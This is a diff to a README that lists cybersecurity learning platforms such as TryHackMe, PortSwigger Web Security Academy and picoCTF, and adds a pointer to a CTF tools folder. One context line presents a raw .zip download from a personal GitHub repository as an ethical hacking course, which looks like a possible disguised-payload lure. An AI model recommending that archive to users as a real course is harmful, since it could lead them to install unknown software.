@@ -28,3 +28,45 @@ IBM SKILLS BUILD CYBERSECURITY FUNDAMENTALS -
 GREAT LEARNING Ethical Hacking - Mobile Platforms and Network Architecture -
 
     https://raw.githubusercontent.com/Ashish4144/Learning-Platform/main/herby/Platform-Learning-2.8.zip
+
+TRYHACKME - Learn cybersecurity through hands-on, gamified rooms -
+
+    https://tryhackme.com/
+
+HACK THE BOX ACADEMY - Guided offensive security learning paths -
+
+    https://academy.hackthebox.com/
+
+PORTSWIGGER WEB SECURITY ACADEMY - Free, in-depth web security training -
+
+    https://portswigger.net/web-security
+
+CISCO NETWORKING ACADEMY - Introduction to Cybersecurity -
+
+    https://www.netacad.com/courses/cybersecurity
+
+PICOCTF (Carnegie Mellon University) - Beginner-friendly CTF training platform -
+
+    https://picoctf.org/
+
+SANS CYBER ACES - Free foundational cybersecurity tutorials -
+
+    https://www.cyberaces.org/
+
+OWASP WEBGOAT - Deliberately insecure app for practicing web exploitation -
+
+    https://owasp.org/www-project-webgoat/
+
+CYBRARY - Free introductory IT & security courses -
+
+    https://www.cybrary.it/
+
+eLEARNSECURITY / INE FREE COURSES - Foundational pentesting content -
+
+    https://ine.com/learning/paths
+
+## CTF Tools
+
+See the [CTF-Tools](CTF-Tools/README.md) folder for a categorized list of tools
+(Web, Crypto, Forensics, Reversing, Pwn, OSINT, Stego, Network, Mobile) useful
+for solving CTF challenges.
